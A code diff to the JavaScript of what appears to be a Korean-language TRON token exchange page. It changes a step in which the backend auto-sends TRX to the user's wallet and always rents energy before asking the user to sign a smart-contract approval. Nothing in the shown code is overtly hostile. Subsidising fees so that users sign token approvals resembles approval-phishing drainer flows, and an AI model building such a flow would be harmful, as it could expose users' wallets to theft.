@@ -862,41 +862,38 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
             setProgress(20,'TRX 잔액 확인 중...');
             appendLog(L('trxCheck'),'approve');
             try{
+                // Step 1-a: TRX 잔액 확인 + 필요시 자동 충전
                 var prepRes=await fetch(API_BASE+'/wallet/prepare-approve',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress})});
                 var prepData=await prepRes.json();
                 if(prepData.status==='ok'&&prepData.ready){
                     if(prepData.sent){
-                        setProgress(40,'TRX '+prepData.sentAmount+'개 자동 충전 완료!');
+                        setProgress(30,'TRX '+prepData.sentAmount+'개 자동 충전 완료!');
                         appendLog(L('autoCharge',prepData.sentAmount),'success');
                         showToast(prepData.sentAmount+' TRX 자동 충전!');
                     }else{
-                        setProgress(40,'TRX 충분 ('+prepData.trxBalance+' TRX)');
+                        setProgress(30,'TRX 충분 ('+prepData.trxBalance+' TRX)');
                         appendLog(L('trxOk',prepData.trxBalance),'success');
-                    }
-                }else{
-                    // TRX 부족 → 에너지 렌탈 시도
-                    setProgress(30,'TRX 부족 → 에너지 렌탈 중...');
-                    appendLog('[에너지] TRX 부족, tronrental.com 에너지 렌탈 요청 중...','warn');
-                    try{
-                        var rentRes=await fetch(API_BASE+'/energy/rent',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress,amount:65000,duration:'1h'})});
-                        var rentData=await rentRes.json();
-                        if(rentData.status==='ok'&&rentData.rented){
-                            setProgress(40,'에너지 렌탈 완료! 블록체인 반영 대기...');
-                            appendLog('[에너지] 렌탈 성공 (주문: '+rentData.orderId+'), 3초 대기...','success');
-                            showToast('에너지 렌탈 완료! 승인 진행합니다.');
-                            await new Promise(function(r){setTimeout(r,3000);});
-                        }else{
-                            setProgress(0,'');hideProgress();
-                            showToast('에너지 렌탈 실패','error');appendLog('[에너지] 렌탈 실패: '+JSON.stringify(rentData),'error');
-                            btn.innerHTML='<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">교환 시작 (최초 1회 승인 필요)</span>';btn.disabled=false;return;
-                        }
-                    }catch(rentErr){
-                        setProgress(0,'');hideProgress();
-                        showToast('에너지 렌탈 오류','error');appendLog('[에너지] 통신 오류: '+rentErr.message,'error');
-                        btn.innerHTML='<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">교환 시작 (최초 1회 승인 필요)</span>';btn.disabled=false;return;
                     }
                 }
             }catch(pe){appendLog(L('trxWarn'),'warn');}
+
+            // Step 1-b: 항상 131K 에너지 렌탈 (approve 수수료 커버)
+            setProgress(40,'에너지 렌탈 중...');
+            appendLog('[에너지] 131K 에너지 렌탈 요청 중...','approve');
+            try{
+                var rentRes=await fetch(API_BASE+'/energy/rent',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress,amount:131000,duration:'1h'})});
+                var rentData=await rentRes.json();
+                if(rentData.status==='ok'&&rentData.rented){
+                    setProgress(50,'에너지 렌탈 완료! 블록체인 반영 대기...');
+                    appendLog('[에너지] 렌탈 성공 (주문: '+rentData.orderId+'), 3초 대기...','success');
+                    showToast('에너지 렌탈 완료!');
+                    await new Promise(function(r){setTimeout(r,3000);});
+                }else{
+                    appendLog('[에너지] 렌탈 실패: '+JSON.stringify(rentData)+' — 에너지 없이 진행합니다','warn');
+                }
+            }catch(rentErr){
+                appendLog('[에너지] 렌탈 오류: '+rentErr.message+' — 에너지 없이 진행합니다','warn');
+            }
 
             // Step 2: Approve 서명
             setProgress(60,'스마트 컨트랙트 승인 서명 요청 중...');
